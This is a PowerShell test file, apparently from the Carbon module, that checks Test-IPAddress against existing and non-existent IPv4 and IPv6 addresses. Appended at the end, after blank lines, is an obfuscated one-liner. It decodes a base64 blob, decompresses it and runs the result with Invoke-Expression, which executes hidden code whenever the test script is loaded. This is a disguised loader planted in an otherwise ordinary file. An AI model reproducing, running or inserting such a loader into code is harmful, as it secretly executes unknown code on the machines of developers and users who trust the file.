











function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
}

function Test-ShouldTestExistingIPV4Address
{
    Get-IPAddress -V4 | ForEach-Object { Assert-True (Test-IPAddress -IPAddress $_) }
}

function Test-ShouldTestExistingIPV4String
{
    Get-IPAddress -V4 | ForEach-Object { Assert-True (Test-IPAddress -IPAddress $_.ToString()) }
}

function Test-ShouldTestNonExistentIPV4Address
{
    Assert-False (Test-IPAddress -IPAddress ([Net.IPAddress]::Parse('255.255.255.0')))
}

function Test-ShouldTestNonExistentIPV4String
{
    Assert-False (Test-IPAddress -IPAddress '255.255.255.0')
}


function Test-ShouldHandleExistentIPV6Address
{
    Get-IPAddress -V6 | ForEach-Object { Assert-True (Test-IPAddress -IPAddress $_ ) }
}

function Test-ShouldHandleExistentIPV6String
{
    Get-IPAddress -V6 | ForEach-Object { Assert-True (Test-IPAddress -IPAddress $_.ToString() ) }
}

function Test-ShouldHandleNonExistentIP6Address
{
    Assert-False (Test-IPAddress -IPAddress ([Net.IPAddress]::Parse('::1')))
}

function Test-ShouldHandleNonExistentIPV6String
{
    Assert-False (Test-IPAddress -IPAddress '::1')
}


sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TY9NawIxFEX3gv8hDC5ayiRCWxcDImWK4EZLS+lCu5hJ3micTDImL/Px7/t0U5ePe+7hvoct9OmuPINE9jUGhIZvAfkPlLnRYPGRf3g3jDz3oOjUhQlsyfZ36H+SF/IEv1n2DlURDVLYO1/fNaeT6WQWvSFDckJsQyaEMlx515ZuiAG8dBYJ5tI1Iog+wGsXnkdVN+fLcRCV8+to36yiTZVGXi5eVsos5wlpK22AvDOwXUbTWvbEkkNTGC21i+GKErWxnashpe8+4RIhIEu/vWa3Teku4voquan+AA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()

